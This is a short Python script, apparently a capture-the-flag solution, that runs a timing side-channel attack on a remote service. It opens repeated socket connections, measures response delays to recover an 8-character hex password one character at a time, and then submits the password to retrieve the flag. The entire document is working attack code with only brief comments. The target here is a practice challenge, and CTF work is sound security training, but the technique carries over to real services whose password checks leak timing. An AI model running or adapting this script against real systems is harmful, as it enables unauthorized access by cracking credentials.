import socket
import time

# Connection details (update with actual server details)
HOST = 'challenge.ctf.games'
PORT = 32516

# Possible characters in a hex password
HEX_CHARS = '0123456789abcdef'
PASSWORD_LEN = 8

def send_guess(guess):
    """ Connects to the server and sends a guess, then measures response time. """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # Read initial prompt

        start_time = time.time()
        s.sendall(guess.encode() + b'\n')
        response = s.recv(1024)  # Read response
        end_time = time.time()

        return end_time - start_time, response

def find_password():
    password = ''

    for position in range(PASSWORD_LEN):
        max_time = 0
        best_char = ''

        for char in HEX_CHARS:
            test_guess = password + char + '0' * (PASSWORD_LEN - len(password) - 1)
            elapsed_time, _ = send_guess(test_guess)

            # Track which character caused the longest delay
            if elapsed_time > max_time:
                max_time = elapsed_time
                best_char = char

        # Add the best character for the current position
        password += best_char
        print(f"Current password guess: {password}")

    return password

# Run the attack
password = find_password()
print(f"Discovered password: {password}")

# Send final guess to retrieve the flag
_, flag_response = send_guess(password)
print(flag_response.decode())
